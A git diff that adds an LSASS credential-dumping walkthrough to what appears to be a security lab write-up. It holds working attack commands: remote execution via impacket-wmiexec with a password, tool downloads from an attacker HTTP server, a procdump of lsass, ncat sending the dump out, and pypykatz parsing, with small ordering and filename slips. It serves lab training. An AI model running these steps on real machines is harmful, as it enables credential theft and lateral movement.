@@ -59,3 +59,48 @@ AS-REP Roastable user
 User with Replicating Rights
 
 ![bloodhound4](/Sandbox_SecurityLab_1/block1-attacks/src/RepRights_user.jpg)
+
+### LSASS Credential Dumping
+Remote Command Execution (RCE) via WMI
+```bash
+impacket-wmiexec 'Steve:Qwerty12345@192.168.100.100'
+```
+
+Copying necessary files to Windows machine
+```bash
+# set on Kali machine listener
+python -m http.server 8000
+
+# receive files from Windows machine with curl method
+curl.exe http://192.168.100.20:8000/ncat.exe -o C:\ncat.exe && curl.exe http://192.168.100.20:8000/procdump64.exe -o C:\procdump64.exe
+```
+![lsassProcess](/Sandbox_SecurityLab_1/block1-attacks/src/wmiexec.jpg)
+
+See the PID number of lsass service & confirm the file is not corrupted:
+```powershell
+tasklist | findstr lsass.exe
+
+certutil -dump C:\lsass.dmp | more
+```
+![lsassProcess](/Sandbox_SecurityLab_1/block1-attacks/src/lsassProcess.jpg)
+
+Create dump file on Windows with procdump64.exe
+```powershell
+procdump64.exe -accepteula -ma 628 C:\lsass.dmp
+```
+
+Sending lsass.dmp to Kali machine
+```bash
+# on Kali machine set listener
+ncat -l 9000 > /home/hunter/Desktop/lsass.dmp
+
+# on Windows machine send to Kali machine
+ncat.exe 192.168.100.20 9000 < C:\lsass.dmp
+```
+Run pypykatz on Kali machine to parse an LSASS memory dump and inspect the authentication-related data stored in it:
+```bash
+pypykatz lsa minidump lsass.exe
+```
+See Full dump file 
+
+![dumpFile](../block1-attacks/src/lsassProove/dump.txt "File")
